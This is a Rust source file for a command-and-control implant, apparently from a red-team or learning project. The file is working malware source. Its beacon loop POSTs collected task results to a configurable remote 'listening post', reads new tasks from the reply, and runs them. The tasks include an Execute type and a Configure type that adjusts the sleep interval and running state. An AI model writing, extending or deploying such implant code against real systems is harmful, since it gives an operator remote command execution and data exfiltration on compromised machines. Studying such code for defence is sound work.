use crate::tasks;
use crate::tasks::Task;
use reqwest::header::HeaderMap;
use reqwest::header::HeaderValue;
use serde_json;
use serde_json::Value;
use std::thread;
use std::time::Duration;
#[derive(Clone)]
pub struct Implant {
    pub host: String,
    pub port: String,
    pub uri: String,
    pub dwell: f64,
    pub is_running: bool,
    pub tasks: Vec<tasks::Task>,
    pub responses: Vec<tasks::Response>,
}

impl Implant {
    async fn send_results(&self) -> Result<String, reqwest::Error> {
        let results_string = serde_json::to_string(&self.responses).unwrap();

        println!("{}", results_string);

        let url = format!("http://{}:{}{}", self.host, self.port, self.uri);
        let client = reqwest::Client::new();
        let mut headers = HeaderMap::new();
        headers.insert("Content-Type", HeaderValue::from_static("application/json"));
        let response = client
            .post(url)
            .headers(headers)
            .body(results_string)
            .send()
            .await?
            .text()
            .await?;
        Ok(response)
    }

    pub async fn beacon(&mut self) {
        while self.is_running {
            println!("Implant is sending results to listening post...\n");
            match self.send_results().await {
                Ok(server_response) => {
                    println!("Listening post response content: {}", server_response);
                    println!("\nParsing tasks received...\n");
                    self.parse_tasks(server_response);
                    println!("\n================================================\n");
                }
                Err(e) => {
                    println!("\nBeaconing error: {}\n", e.to_string());
                }
            }
            self.service_tasks();
            thread::sleep(Duration::from_secs_f64(self.dwell));
        }
    }

    fn parse_tasks(&mut self, tasks_string: String) {
        let new_tasks: Vec<Task> = serde_json::from_str(&tasks_string).unwrap();

        self.tasks.extend(new_tasks)
    }

    fn service_tasks(&mut self) {
        for task in self.tasks.iter_mut() {
            let response = match task {
                tasks::Task::Ping(ping_task) => ping_task.run(),
                tasks::Task::Configure(configure_task) => {
                    self.is_running = configure_task.is_running;
                    self.dwell = configure_task.dwell;
                    configure_task.run()
                }
                tasks::Task::Execute(execute_task) => execute_task.run(),
            };
            self.responses.push(response);
        }
    }
}
